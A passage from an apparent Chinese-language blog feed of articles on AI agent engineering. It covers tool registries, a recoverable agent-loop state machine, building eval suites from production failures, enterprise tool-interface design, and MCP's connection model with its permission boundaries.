<h2 id="Registry-也是治理和观测入口"><a href="#Registry-也是治理和观测入口" class="headerlink" title="Registry 也是治理和观测入口"></a>Registry 也是治理和观测入口</h2><p>每次调用记录 registry snapshot、tool version、schema hashes、policy decision、latency、error code 与 outcome。Dashboard 能按工具版本看成功率、参数错误、权限拒绝、重试和副作用验证。</p>
<p>owner 收到的是可行动问题：v3 <code>OBJECT_AMBIGUOUS</code> 上升、timeout 后重复请求被幂等挡住多少次、哪些结果字段经常缺失。不是一个笼统的 Agent failure rate。</p>
<p>权限和数据分类变更也发布新 manifest&#x2F;policy binding。description 不泄露内部对象和策略细节，模型可见视图与执行器完整视图分开，但共享同一个 capability ID&#x2F;version。</p>
<p>工具注册表成熟后，Agent 才能在不断增长的能力中安全选择。它不是一份给模型看的函数列表，而是连接设计、权限、执行、测试和生命周期的契约中心。</p>
<h2 id="对照规范与资料"><a href="#对照规范与资料" class="headerlink" title="对照规范与资料"></a>对照规范与资料</h2><ul>
<li><a href="https://json-schema.org/draft/2020-12/json-schema-core">JSON Schema 2020-12 Core：schema 与 vocabulary</a></li>
<li><a href="https://spec.openapis.org/oas/v3.0.3">OpenAPI 3.0.3：Operation、Parameter、Request Body 与 Responses</a></li>
<li><a href="https://semver.org/spec/v2.0.0.html">Semantic Versioning 2.0.0：兼容性与版本约定</a></li>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023 Function Calling：函数描述与 JSON Schema 参数</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>版本管理</tag>
        <tag>工具注册表</tag>
        <tag>能力治理</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent Loop 不能靠 while true：状态、等待与副作用要可恢复</title>
    <url>//2024/10/15/agent-loop-state-machine/</url>
    <content><![CDATA[<p>最小 Agent loop 往往是一段 <code>while true</code>：调用模型，看到 tool call 就执行并把结果放回消息，看到 final answer 就结束。Demo 里足够，生产中只要进程重启、用户确认等十分钟、工具超时但实际成功，内存里的循环就无法给出正确恢复。</p>
<p>我会把 loop 做成持久化状态机。每次模型 attempt、工具 operation、用户等待和最终化都有独立状态，迁移先写事件和 artifact，再推进 current state。重启后从最后一个已提交状态恢复，不从对话文本猜执行到哪里。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-loop-state-machine.svg" class="lazyload" data-srcset="/images/articles/agent-loop-state-machine.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent Loop 的可恢复状态机"></p>
<span id="more"></span>

<h2 id="READY-构建的是一次确定输入"><a href="#READY-构建的是一次确定输入" class="headerlink" title="READY 构建的是一次确定输入"></a>READY 构建的是一次确定输入</h2><p>READY 阶段冻结本轮输入：conversation state、memory snapshot、retrieval evidence、tool registry、policy、model route 和剩余 budget。产出 context artifact hash，然后才进入 MODEL_RUNNING。</p>
<p>如果构建上下文时一边读取不断变化的 memory&#x2F;index，一次 retry 可能看到不同事实。新 attempt 默认复用同一 context artifact；明确允许刷新知识时生成新的 step，并记录变化。</p>
<p>step 有单调编号，attempt 是 step 内模型调用次数。run&#x2F;step&#x2F;attempt 三层身份进入 trace。模型流断开重试不会把已完成工具结果重复插入，也不会把两次生成混成一个 assistant message。</p>
<p>deadline、max_steps、token&#x2F;cost&#x2F;tool-call budgets 在 READY 检查。耗尽进入明确终态，不再让模型“最后再试一次”。预算是运行时约束，不靠 Prompt 提醒。</p>
<h2 id="MODEL-RUNNING-与-VALIDATING-必须分开"><a href="#MODEL-RUNNING-与-VALIDATING-必须分开" class="headerlink" title="MODEL_RUNNING 与 VALIDATING 必须分开"></a>MODEL_RUNNING 与 VALIDATING 必须分开</h2><p>模型返回 final text 或 tool proposal 前，流可能 incomplete、truncated、blocked。MODEL_RUNNING 只负责收集原生&#x2F;统一事件并形成 candidate artifact；看到可信 finish 才进入 VALIDATING。</p>
<p>VALIDATING 检查结构、tool name&#x2F;schema、对象、权限、引用和输出规则。candidate 不合法时，根据错误类型有限修复、追问或失败。不能在流还没结束时看到半个 function arguments 就启动工具。</p>
<p>模型输出 final answer 也不直接 success。先检查核心 claims&#x2F;evidence、敏感内容和任务 completion condition，再进入 FINALIZING。一个“已经完成”的自然语言句子不能替代工具状态。</p>
<p>每个 validation decision 保存 version 和 evidence。Prompt&#x2F;validator 更新后可对原 candidate 回放，无需再调用模型。</p>
<h2 id="TOOL-RUNNING-围绕-Operation，而不是-HTTP-调用"><a href="#TOOL-RUNNING-围绕-Operation，而不是-HTTP-调用" class="headerlink" title="TOOL_RUNNING 围绕 Operation，而不是 HTTP 调用"></a>TOOL_RUNNING 围绕 Operation，而不是 HTTP 调用</h2><p>通过验证的 tool proposal 创建 operation，带 idempotency key、canonical arguments、expected resource version 和 policy decision。HTTP 请求 timeout 后状态是 UNKNOWN&#x2F;PENDING_RECONCILIATION，不立刻创建新 operation。</p>
<p>恢复时先按 operation ID&#x2F;idempotency key 查询。后端已成功就记录结果并回到 READY；确认未执行才安全重投；无法确认则暂停或人工，不让两个 attempt 同时改资源。</p>
<p>工具 accepted&#x2F;running&#x2F;succeeded&#x2F;failed 与 Agent node 状态分开。长任务返回 accepted，Agent 可以 WAIT_TOOL 或释放 worker，由回调&#x2F;轮询事件唤醒。不能占一个模型连接等几个小时。</p>
<p>工具结果写成不可变 artifact，下一 READY 通过引用加入上下文。大日志不整段塞入，先用确定规则提取摘要与关键证据，原始内容保留 evidence ref。</p>
<h2 id="WAITING-USER-是可持久化状态"><a href="#WAITING-USER-是可持久化状态" class="headerlink" title="WAITING_USER 是可持久化状态"></a>WAITING_USER 是可持久化状态</h2><p>需要澄清或确认时，状态机生成 question&#x2F;plan artifact、expected response schema、expiry 和 resume token。进程退出、服务发布都不影响等待。</p>
<p>用户回复后验证 run&#x2F;state&#x2F;version&#x2F;token。过期确认、重复提交或 plan 已变化都拒绝；有效事件只消费一次。模型生成的新一轮问题不能复用上一轮 approval。</p>
<p>WAITING_USER 不占并发执行槽，但计入业务 SLA。Dashboard 区分系统处理时间与用户等待时间。超时后进入 EXPIRED&#x2F;CANCELLED，执行必要清理。</p>
<p>用户发来完全不同的新目标时，是继续当前 Run 还是新 Run，由产品协议明确。不能把它随手追加到旧 loop，让已确认的工具计划与新意图混在一起。</p>
<h2 id="FINALIZING-负责唯一终态"><a href="#FINALIZING-负责唯一终态" class="headerlink" title="FINALIZING 负责唯一终态"></a>FINALIZING 负责唯一终态</h2><p>FINALIZING 汇总模型结果、工具 operations、evidence、usage、成本和 warnings，检查 completion invariants。只有所有必要副作用已验证、核心答案可支持，Run 才 SUCCEEDED。</p>
<p>模型正常结束但工具仍 running，Run 是 WAITING_TOOL，不是 success；工具成功但最终文本断流，可生成新 summarization attempt，不重做工具；用户取消但后端无法确认停止，状态是 CANCEL_UNKNOWN。</p>
<p>终态只追加一次，使用 compare-and-set 防两个 worker 同时 finalize。迟到事件保留在历史，但不能覆盖终态；若确需更正，通过 resolution&#x2F;reopen 事件建立新版本。</p>
<p>最终响应与持久化原子关联。客户端收到 success 前，结果 artifact 和终态已经提交；发送失败可以重读，不重新运行整个 loop。</p>
<h2 id="循环检测不仅看步数"><a href="#循环检测不仅看步数" class="headerlink" title="循环检测不仅看步数"></a>循环检测不仅看步数</h2><p>固定 max_steps 能兜底，还要识别重复模式：连续相同 tool + argument hash、同一错误码反复出现、上下文没有新增 evidence、计划在两个状态间来回。触发后停止并给出 loop diagnosis。</p>
<p>工具错误定义 recovery actions。PERMISSION_DENIED 不重试，OBJECT_AMBIGUOUS 追问，RATE_LIMIT 受总 deadline 退避，STATE_CONFLICT 刷新对象后重新计划。把所有错误交给模型，会产生无意义循环。</p>
<p>每一步要求 progress marker，例如新增 evidence、完成 operation 或缩小候选。没有进展的连续步骤超过阈值，转人工或失败。progress 由运行时事实计算，不让模型自报“有进展”。</p>
<p>ReAct 展示了推理与动作交错的能力；生产 Agent 的外层仍需要像调度系统一样明确状态、重试和终态。自由规划可以留在 MODEL_RUNNING，持久化、权限和副作用必须由状态机接管。</p>
<p>Agent Loop 从 while true 升级为可恢复状态机后，重启、等待、超时和迟到事件都有确定位置。系统才有能力解释执行到哪、下一步为何发生，并保证同一个真实动作不会因为模型或网络重试被做两次。</p>
<h2 id="对照论文与源码"><a href="#对照论文与源码" class="headerlink" title="对照论文与源码"></a>对照论文与源码</h2><ul>
<li><a href="https://arxiv.org/abs/2210.03629">ReAct：Reasoning 与 Actions 交错的 Agent 模式</a></li>
<li><a href="https://github.com/apache/airflow/blob/7b979def75923ba28dd64e31e613043d29f34fce/airflow/utils/state.py#L25-L71">Apache Airflow 2.4.1：TaskInstance 与 DagRun 状态枚举</a></li>
<li><a href="https://opentelemetry.io/docs/specs/otel/trace/api/">OpenTelemetry Trace：Span events、links 与 status</a></li>
<li><a href="https://json-schema.org/draft/2020-12/json-schema-validation">JSON Schema 2020-12 Validation：状态输入输出的结构契约</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>状态机</tag>
        <tag>Agent Loop</tag>
        <tag>持久化执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent 评测集从哪里来：先把每次生产失败变成可回放用例</title>
    <url>//2024/08/18/agent-eval-from-failures/</url>
    <content><![CDATA[<p>Agent 评测最容易从“先造 100 道题”开始。题目通常干净、步骤短、工具永远成功，最后测出一个不错的完成率。生产失败却来自另一套分布：权限刚变化、工具 200 但 body 缺字段、流中途断开、两个同名对象、旧 memory 污染了本轮。</p>
<p>我更愿意从真实失败反向建设评测。每个对用户有影响的 Run，先完成证据归因，再抽成最小可复现场景，脱敏审核后加入固定版本的 regression suite。评测集不是一次性题库，而是系统故障经验的可执行资产。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-eval-from-failures.svg" class="lazyload" data-srcset="/images/articles/agent-eval-from-failures.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="从生产失败生成可回放评测"></p>
<span id="more"></span>

<h2 id="先确认失败发生在哪一层"><a href="#先确认失败发生在哪一层" class="headerlink" title="先确认失败发生在哪一层"></a>先确认失败发生在哪一层</h2><p>用户说“Agent 没把任务重跑成功”，可能是五类问题：上下文选错实例，模型选错工具&#x2F;参数，工具适配器丢字段，权限策略拒绝，或任务已执行但流式最终结果丢了。</p>
<p>trace 要包含输入、检索、模型 attempts、工具 proposal、policy、operation、raw&#x2F;normalized events 和 finalization。归因从可验证事实开始：后端是否产生 operation ID，资源状态是否变化，模型是否收到完整结果。</p>
<p>一个 Run 可以有主因与放大因素。模型参数错是主因，错误码不稳定导致无限重试是放大；工具已成功、最终消息断流，主因是 runtime&#x2F;protocol，不应加入“模型不会调用工具”的评测桶。</p>
<p>无法归因时标 unknown，并补观测。硬选一个团队背锅，会把错误样本放进错误评测，后续修复反而污染系统。</p>
<h2 id="抽取最小场景，不复制全部生产会话"><a href="#抽取最小场景，不复制全部生产会话" class="headerlink" title="抽取最小场景，不复制全部生产会话"></a>抽取最小场景，不复制全部生产会话</h2><p>生产 trace 可能很长且含敏感数据。评测用例保留触发失败所需的最小输入、权限上下文、对象状态、工具响应和关键历史。删除无关消息后重新运行，若失败不再出现，说明删掉的内容可能是条件，要逐步加回。</p>
<p>环境依赖用 fixture&#x2F;mocks 固定：Catalog 返回两个同名任务，工具第一次 timeout 但实际已执行，SSE 在 finish 前断开，policy version 拒绝跨项目。mock 响应来自去敏真实形态，包含原协议边界，不只写一个理想 JSON。</p>
<p>断言描述不变量，不强求逐字输出。例如必须选择用户明确的 <code>prod/job_17</code>、不得重复执行 operation、最终状态不得 success、答案必须引用 error evidence。自然语言可以变化，安全和业务结果不能。</p>
<p>模型具有随机性，单次通过不足。按风险设重复次数和通过门槛；权限越权用例要求零违规，普通措辞问题允许统计比较。temperature、model snapshot、Bundle 与工具版本都固定。</p>
<h2 id="脱敏后仍要保留工程结构"><a href="#脱敏后仍要保留工程结构" class="headerlink" title="脱敏后仍要保留工程结构"></a>脱敏后仍要保留工程结构</h2><p>把所有名称替换成 <code>foo/bar</code>，可能破坏同名歧义、语言和长度特征。脱敏使用一致映射：同一个真实对象在所有事件里变成同一个测试 ID，不同环境和层级关系仍保留。</p>
<p>敏感文本可改写成结构相同的合成内容，但保存哪些特征必须保留：Prompt Injection 位置、错误码格式、JSON 分片、超长字段、权限标签。评测 owner 审核没有凭据、个人信息和商业内容后才入库。</p>
<p>每个 case 记录 source incident&#x2F;run ref、failure category、risk、owner、created_at、dataset version 和 expected behavior。真实 trace 的访问受限，普通评测只使用脱敏 fixture。</p>
<p>用户删除数据时，评测集也要追踪派生关系。若用例无法在合规基础上继续保留，就删除或重新合成，不能因为已脱敏就默认永久保存。</p>
<h2 id="回归集分能力与守门"><a href="#回归集分能力与守门" class="headerlink" title="回归集分能力与守门"></a>回归集分能力与守门</h2><p>能力集衡量任务完成、答案正确、引用、成本和延迟；守门集覆盖权限、重复副作用、Prompt Injection、错误终态、敏感输出与不可逆动作。发布先过守门，再比较能力收益。</p>
<p>失败按矩阵分桶：context&#x2F;retrieval、model decision&#x2F;output、tool&#x2F;protocol、policy&#x2F;auth、runtime&#x2F;state、final answer。每次改动展示修复了哪些 case、新增了哪些失败，不只给一个平均分。</p>
<p>重要但低频的生产事故单独加权。若一万条摘要题盖过一次生产误删，平均分没有风险意义。高风险用例使用绝对门槛，不允许被其他提升抵消。</p>
<p>数据集版本不可变。新增&#x2F;修正标注发布新版本，历史发布报告继续引用旧 hash。评测代码与 judge model 也版本化，避免“同一分数”实际由不同评审标准产生。</p>
<h2 id="修复需要验证因果"><a href="#修复需要验证因果" class="headerlink" title="修复需要验证因果"></a>修复需要验证因果</h2><p>一条工具参数失败后，在 Prompt 里加完整正确答案，当然能让该用例通过，却可能是记忆题。修复前写假设：schema 描述不清、对象解析缺失、模型选择错或 validator 太宽。一次只改变对应变量，在相邻&#x2F;变体用例上验证泛化。</p>
<p>对照实验固定其余 Bundle。改 Prompt 时固定 model、tools、index；改 adapter 时用固定 raw events；改 policy 时用固定 proposal&#x2F;resource state。端到端再验证组合效果。</p>
<p>通过离线集后影子&#x2F;灰度，观察真实失败桶、人工接管、工具调用数、成本和延迟。测试集无法覆盖所有分布，生产守门指标仍是发布条件。</p>
<p>修复上线后关闭 incident 的标准不是“这次能跑”，而是原始&#x2F;脱敏 case 稳定通过、没有新增高风险回归、线上同类错误下降。证据链才算闭环。</p>
<h2 id="评测基础设施也要防自欺"><a href="#评测基础设施也要防自欺" class="headerlink" title="评测基础设施也要防自欺"></a>评测基础设施也要防自欺</h2><p>模型评审器可能偏好长答案、与自己风格相似的输出，或用自身知识补足缺失证据。关键事实使用确定性断言，引用验证对照 source spans，高风险结论人工抽查。LLM judge 只承担难以规则化的部分，并记录理由与版本。</p>
<p>测试工具不能总返回成功。准备 timeout、429、200-malformed、迟到回调、状态冲突、部分结果和不可重试错误。Agent 的可靠性主要在失败路径里体现。</p>
<p>结果报告展示样本量和置信区间。一个新任务桶只有五条样本，不能根据 100% 通过就全量路由。线上收集更多真实 Run 后再更新权重。</p>
<p>OpenAI Evals 提供了用测试样本评估模型行为的框架，NIST AI RMF 强调测量与持续管理风险。对企业 Agent，最有价值的样本来源就是自身运行失败：它包含真实工具、权限和状态边界，也是团队已经付过代价的经验。</p>
<p>把生产失败变成回放用例后，每次事故不只留下一篇复盘文档，还会变成以后发布必须跨过的门槛。评测才从展示模型能力，转向保护系统不重复犯同一种错。</p>
<h2 id="对照框架与资料"><a href="#对照框架与资料" class="headerlink" title="对照框架与资料"></a>对照框架与资料</h2><ul>
<li><a href="https://github.com/openai/evals">OpenAI Evals：用样本与 grader 评估模型输出</a></li>
<li><a href="https://www.nist.gov/itl/ai-risk-management-framework">NIST AI Risk Management Framework 1.0</a></li>
<li><a href="https://www.w3.org/TR/trace-context/">W3C Trace Context：关联生产 Run 的跨服务证据</a></li>
<li><a href="https://json-schema.org/draft/2020-12/json-schema-validation">JSON Schema 2020-12 Validation：结构化输入输出断言基础</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent 评测</tag>
        <tag>回归测试</tag>
        <tag>故障复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>企业 Agent 工具接口怎么设计：别把内部 API 原样暴露给模型</title>
    <url>//2024/11/20/enterprise-agent-tool-interface/</url>
    <content><![CDATA[<p>企业系统通常已经有大量 REST&#x2F;RPC API，把 OpenAPI 文档转成 function schemas，看起来就能让 Agent 使用。问题是内部 API 是为确定性程序和后台页面设计的：参数宽、状态隐含、错误复杂，调用方默认知道对象 ID 和业务前置条件。模型不具备这些默认知识。</p>
<p>我会在现有 API 外增加 Agent Tool Facade。接口围绕用户目标和安全闭环设计，而不是一一映射 Controller 方法。典型动作拆成 Discover&#x2F;Resolve、Preview、Execute、Observe、Verify&#x2F;Compensate。</p>
<p class="article-diagram-scroll"><img src="/images/articles/enterprise-agent-tool-interface.svg" class="lazyload" data-srcset="/images/articles/enterprise-agent-tool-interface.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="企业工具接口的 Preview-Execute-Observe 闭环"></p>
<span id="more"></span>

<h2 id="工具按业务动作收窄"><a href="#工具按业务动作收窄" class="headerlink" title="工具按业务动作收窄"></a>工具按业务动作收窄</h2><p>内部接口 <code>POST /jobs/action</code> 接受 actionType、config、force、skipChecks 等几十个字段，对 Agent 太宽。更合适的工具是 <code>rerun_failed_job_instance</code>、<code>stop_running_instance</code>、<code>get_job_logs</code>，每个动作有固定风险和参数。</p>
<p>窄工具减少模型选择空间，也让权限落到具体 action。重跑与停止不是同一个 <code>job:write</code>；查看摘要日志与下载完整日志也可以分权限。</p>
<p>参数使用稳定 resource ID、明确 date-time、enum 和有限数组。自由文本只用于 reason&#x2F;comment，不参与对象定位和权限。<code>additionalProperties: false</code>，字符串、列表和时间范围都有上限。</p>
<p>description 说明何时使用、不适用条件和结果含义，但关键规则仍由代码验证。不能依赖“只在任务失败时调用”一句描述，工具服务要读取实例当前状态。</p>
<h2 id="Discover-与-Resolve-不和-Execute-混在一起"><a href="#Discover-与-Resolve-不和-Execute-混在一起" class="headerlink" title="Discover 与 Resolve 不和 Execute 混在一起"></a>Discover 与 Resolve 不和 Execute 混在一起</h2><p>用户通常说名称，动作需要 ID。让 execute 工具同时按模糊名称搜索并执行，遇到同名对象只能猜。先用 discover 返回权限过滤后的候选，再 resolve 到唯一对象。</p>
<p>候选包含 display name、project、environment、owner、state 和 immutable ID&#x2F;version。低置信或多个候选时由用户确认；后续 preview&#x2F;execute 只接受选定 ID。</p>
<p>列表支持 pagination&#x2F;cursor 与 query limit。Agent 不应该为了找一个任务把全公司对象拉进上下文。搜索结果返回 match reasons，模型可以解释为何需要确认。</p>
<p>对象不存在与无权访问的外部错误按安全策略合并，避免枚举。内部审计保留真实原因和 policy decision。</p>
<h2 id="Preview-生成确定计划"><a href="#Preview-生成确定计划" class="headerlink" title="Preview 生成确定计划"></a>Preview 生成确定计划</h2><p>有副作用的工具先 preview。服务端规范化参数、读取 current state、计算影响范围、依赖、资源成本、风险与回滚方式，返回 plan ID&#x2F;hash、expected resource version 和 expiry。</p>
<p>计划内容结构化，UI 直接渲染目标与影响。模型可以补充说明，但确认基于原始 plan。若补数会覆盖 31 个分区、重跑会触发 12 个下游，不能靠模型总结是否提到。</p>
<p>preview 本身只读、可重试，但仍需权限。它可能暴露对象、依赖和成本。用户确认 token 绑定 subject、action、plan hash 和 expiry，参数或状态变化重新 preview。</p>
<p>低风险查询可不需要 preview，但所有变更工具保持一致模式，Agent runtime 无需为每个后端发明确认逻辑。</p>
<h2 id="Execute-返回-Operation，不等待所有事情结束"><a href="#Execute-返回-Operation，不等待所有事情结束" class="headerlink" title="Execute 返回 Operation，不等待所有事情结束"></a>Execute 返回 Operation，不等待所有事情结束</h2><p>执行请求携带 plan&#x2F;approval 与 idempotency key。服务端先落 operation 记录，再提交真实动作，立即返回 operation ID 与 accepted 状态。长任务不占模型连接，也不让 HTTP timeout 表示业务失败。</p>
<p>相同 key、相同参数返回原 operation；相同 key、不同参数冲突。调用超时后 Agent 先 <code>get_operation</code>，确认不存在再重试。idempotency 由工具实现兜底，不只靠网关缓存。</p>
<p>operation 状态至少 accepted&#x2F;running&#x2F;succeeded&#x2F;failed&#x2F;cancel_requested&#x2F;cancelled&#x2F;unknown。progress 有 sequence 和 observed time；重复&#x2F;乱序回调幂等归并。</p>
<p>取消是独立动作，也要返回 operation。用户点停止不等于后端立刻终止；只有执行系统确认，状态才 cancelled。unknown 进入对账，不能显示绿色“已停止”。</p>
<h2 id="Observe-返回有限证据"><a href="#Observe-返回有限证据" class="headerlink" title="Observe 返回有限证据"></a>Observe 返回有限证据</h2><p>状态接口给机器读的 code、progress、result summary、error code、retryable、evidence refs 和 next allowed actions。不要让 Agent 从一大段日志文本猜操作是否成功。</p>
<p>错误映射稳定：PERMISSION_DENIED、STATE_CONFLICT、RATE_LIMITED、VALIDATION_FAILED、DOWNSTREAM_UNAVAILABLE。底层堆栈和内部 URL 不进入模型，运维通过 evidence ref 查看。</p>
<p>progress 事件与最终结果可订阅或轮询，但一次 operation 只有一个单调状态历史。网络断开后从 operation ID 恢复，不创建新执行。</p>
<p>结果按用户权限过滤。日志、受影响对象和输出文件链接都使用短期授权，不能因为工具调用成功就扩大结果访问。</p>
<h2 id="Verify-与-Compensate-让闭环完整"><a href="#Verify-与-Compensate-让闭环完整" class="headerlink" title="Verify 与 Compensate 让闭环完整"></a>Verify 与 Compensate 让闭环完整</h2><p>API 返回 succeeded 可能只表示请求已写库。对关键动作做业务回读：任务实例是否生成、目标分区是否发布、配置版本是否真的切换。verification outcome 与 execution outcome 分开记录。</p>
<p>失败后补偿不是执行原操作的反函数字符串。工具定义明确 compensatable、compensation tool&#x2F;plan、所需旧版本和窗口。不可补偿动作在 preview 标出，并提高确认等级。</p>
<p>Agent 可以建议补偿，真正执行仍走 preview&#x2F;authorize&#x2F;execute。不能因为上一工具失败，就自动获得修复权限。</p>
<p>整个链路用 run ID、tool call ID、plan ID、operation ID 和 evidence refs 关联。评测覆盖超时后已成功、重复请求、状态变化、确认过期、部分成功和补偿失败，不只测 200 happy path。</p>
<p>Agent Tool Facade 不是多包一层 JSON，而是把企业 API 隐含的身份、状态和副作用变成显式契约。模型负责表达用户意图，工具负责让每个动作可预览、可授权、可查询、可验证，二者的责任才清楚。</p>
<h2 id="对照规范与资料"><a href="#对照规范与资料" class="headerlink" title="对照规范与资料"></a>对照规范与资料</h2><ul>
<li><a href="https://spec.openapis.org/oas/v3.0.3">OpenAPI 3.0.3：Operation、Request Body、Responses 与 Schema</a></li>
<li><a href="https://json-schema.org/draft/2020-12/json-schema-validation">JSON Schema 2020-12 Validation：输入输出结构约束</a></li>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023 Function Calling：模型生成函数名与 JSON 参数</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc9110">RFC 9110：HTTP 方法、状态与幂等语义</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent 工具</tag>
        <tag>接口设计</tag>
        <tag>企业集成</tag>
      </tags>
  </entry>
  <entry>
    <title>MCP 带来了什么：统一连接协议，不等于统一权限系统</title>
    <url>//2024/12/13/mcp-connection-standard/</url>
    <content><![CDATA[<p>Anthropic 在 11 月 25 日公开 Model Context Protocol（MCP）后，Agent 连接数据和工具终于有了一套开放协议。它解决的核心问题很实际：每个 AI 应用不必为每个数据源重复写私有集成，Server 可以用统一方式暴露 resources、prompts 和 tools。</p>
<p>但 MCP 是连接与能力发现协议，不会替企业完成对象权限、审批、数据分级和副作用治理。我会把 MCP Client&#x2F;Server 放进现有 Agent Gateway，而不是让发现到的 Server 直接获得执行权。</p>
<p class="article-diagram-scroll"><img src="/images/articles/mcp-connection-standard.svg" class="lazyload" data-srcset="/images/articles/mcp-connection-standard.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="MCP 连接层与企业治理层"></p>
<span id="more"></span>

<h2 id="Host、Client、Server-先分清责任"><a href="#Host、Client、Server-先分清责任" class="headerlink" title="Host、Client、Server 先分清责任"></a>Host、Client、Server 先分清责任</h2><p>2024-11-05 版规范中，Host 是运行 LLM 应用、管理用户交互和多个连接的应用；Client 是 Host 内与一个 Server 建立协议连接的组件；Server 提供上下文和能力。</p>
<p>这个分层很重要。用户身份、哪些 Server 可连接、哪些数据能发给模型、是否确认工具调用，都属于 Host 的产品与安全责任。Server 声明自己有某个 tool，不代表当前用户自动有权使用。</p>
<p>每个 Client-Server 连接有独立 session&#x2F;capabilities。一个 Server 的资源与另一个 Server 的工具不能在 Host 中无条件组合；跨 Server 数据流动仍要经过数据策略。例如把内部文档内容发给外部搜索 Server，MCP 格式合法也可能违反数据边界。</p>
<p>企业侧维护 Server registry&#x2F;allowlist，记录 owner、发布来源、版本、transport、身份方式、数据分类和风险。用户给一个任意启动命令或 URL，不能直接成为受信 Server。</p>
<h2 id="Initialize-是协议版本与能力协商"><a href="#Initialize-是协议版本与能力协商" class="headerlink" title="Initialize 是协议版本与能力协商"></a>Initialize 是协议版本与能力协商</h2><p>规范要求连接先发送 <code>initialize</code>，双方协商 protocolVersion、capabilities 和 implementation info，随后 Client 发送 initialized notification。初始化完成前不能随意调用其他方法。</p>
<p>Client 必须验证 Server 返回的版本自己支持；能力只使用已协商集合。Server 没声明 tools，就不能因为它恰好响应 <code>tools/list</code> 而调用。未知 experimental capability 默认关闭，通过 allowlist 显式开启。</p>
<p>初始化与每个请求都有 timeout。stdio 子进程可能卡住，HTTP 连接也可能半开。生命周期关闭时释放进程、连接和订阅，不能让一个坏 Server 长期占资源。</p>
<p>协商结果与 Server binary&#x2F;image hash 写入 connection trace。运行中 Server 列表变化或重启后，重新初始化，不能沿用旧 capabilities 假定。</p>
<h2 id="Resources、Prompts、Tools-的控制者不同"><a href="#Resources、Prompts、Tools-的控制者不同" class="headerlink" title="Resources、Prompts、Tools 的控制者不同"></a>Resources、Prompts、Tools 的控制者不同</h2><p>规范把三类 Server 能力分开：resources 是应用控制的上下文数据，prompts 是用户选择的模板，tools 是模型可发现和调用的函数。这种区别比“所有东西都是函数”更清楚。</p>
<p>Resources 用 URI 标识，可读取或订阅。URI 是协议身份，不自动等于授权。Host 在读取前检查用户与 Server scope，内容进入模型前保留来源、mime type、版本和 trust label。订阅更新还要处理权限撤销与缓存失效。</p>
<p>Prompts 返回模板&#x2F;消息，仍是 Server 提供的数据。Host 不应把远端 prompt 当成最高优先级 system policy，也不允许它覆盖用户身份和工具规则。不可信 Server prompt 与网页内容有相同注入风险。</p>
<p>Tools 包含 name、description 和 inputSchema，调用用 <code>tools/call</code>。Client 仍要做 schema、对象、权限、确认、幂等和结果验证。规范安全说明也强调工具代表任意代码执行能力，应用应让用户看见并控制调用。</p>
<h2 id="传输安全与工具安全是两件事"><a href="#传输安全与工具安全是两件事" class="headerlink" title="传输安全与工具安全是两件事"></a>传输安全与工具安全是两件事</h2><p>stdio Server 在本机进程运行，风险是它继承的文件、环境变量和网络权限；HTTP Server 涉及服务身份、TLS、token、租户和网络边界。MCP 统一消息，不会自动沙箱进程或替你认证远端。</p>
<p>本地 Server 用最小环境启动，秘密按 Server 单独注入，文件系统和 egress 受限。不要把整个 shell 环境传给第三方 Server。binary 来源、签名&#x2F;hash 与升级记录进入 registry。</p>
<p>远端连接通过企业 gateway，token 不暴露给模型，Server 不能自行请求扩大 scope。每个 request 关联 user&#x2F;session&#x2F;run，policy 在 Host 与业务工具端双重检查。</p>
<p>Server 返回的 text&#x2F;resource&#x2F;error 均视为不可信数据。它可以影响模型候选，不可以绕过 Host 策略触发另一个工具。嵌入 resource 的内容也需按 URI 重新鉴权和限制大小。</p>
<h2 id="Tool-List-变化需要版本控制"><a href="#Tool-List-变化需要版本控制" class="headerlink" title="Tool List 变化需要版本控制"></a>Tool List 变化需要版本控制</h2><p>规范支持 <code>listChanged</code> capability&#x2F;notification。收到变化通知后，Client 重新拉列表，但不应直接把新工具塞进运行中的 Agent。先验证 schema、registry policy 与 Bundle compatibility，新 Run 才使用新 snapshot。</p>
<p>同名工具 schema 改变要视为新 capability version。MCP 初始工具模型只有 name&#x2F;description&#x2F;inputSchema，企业 registry 还要补 output&#x2F;error、risk、permissions、idempotency、owner 与 implementation version。</p>
<p>一次 Run 保存 server ID、protocol version、capabilities hash 和 tool list hash。故障回放才能知道模型当时看见哪些工具。Server 重启后定义漂移，没有这些 hash 很难解释参数为何突然无效。</p>
<p>弃用先查哪些 Agent Bundles 和未完成 Runs 仍引用。紧急安全禁用在 Host policy 立即生效，即便 Server 继续列出该工具。</p>
<h2 id="把-MCP-当适配层，不当治理终点"><a href="#把-MCP-当适配层，不当治理终点" class="headerlink" title="把 MCP 当适配层，不当治理终点"></a>把 MCP 当适配层，不当治理终点</h2><p>企业平台可以用 MCP 接入 Catalog、Git、数据库与工单，但 Server 端最好仍封装窄业务能力。把通用 SQL、shell 或任意 HTTP 暴露出来，只是用标准协议扩大了危险面。</p>
<p>Gateway 统一观测 initialize、list&#x2F;read&#x2F;call、progress、cancel、errors 和 connection lifecycle，并与 Agent run、policy decision、operation ID 关联。原生 JSON-RPC 与归一化工具事件双轨保存。</p>
